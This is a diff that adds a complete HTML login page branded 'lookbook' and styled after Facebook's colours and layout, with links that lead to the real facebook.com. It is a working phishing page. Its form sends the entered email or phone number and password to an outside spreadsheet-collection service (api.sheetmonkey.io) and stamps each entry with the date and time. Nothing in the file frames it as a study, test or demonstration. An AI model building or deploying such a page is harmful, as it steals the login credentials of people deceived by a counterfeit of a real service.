@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lookbook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo h1 {
+            color: #1877f2;
+            font-size: 42px;
+            margin: 0;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            margin-bottom: 10px;
+            padding: 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .create-account button {
+            background-color: #42b72a;
+            font-size: 17px;
+            padding: 10px 16px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                width: 100%;
+                height: 100%;
+                border-radius: 0;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>lookbook</h1>
+        </div>
+<form action="https://api.sheetmonkey.io/form/wfkNfBo1qwm39pxjEjYJcs" method="post">
+            <input type="text" placeholder="Email address or phone number" name="Example Header" >
+            <input type="password" placeholder="Password" name="Example Password">
+    <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
+  <input type="hidden" name="Example Password" />
+  <input type="hidden" name="Example Header"  />
+            <button type="submit">Log in</button>
+        </form>
+        <div class="forgot-password">
+            <a href="https://www.facebook.com/">Forgotten password?</a>
+        </div>
+        <div class="create-account">
+            <button href="https://www.facebook.com/" >Create new account</button>
+        </div>
+    </div>
+</body>
+</html>
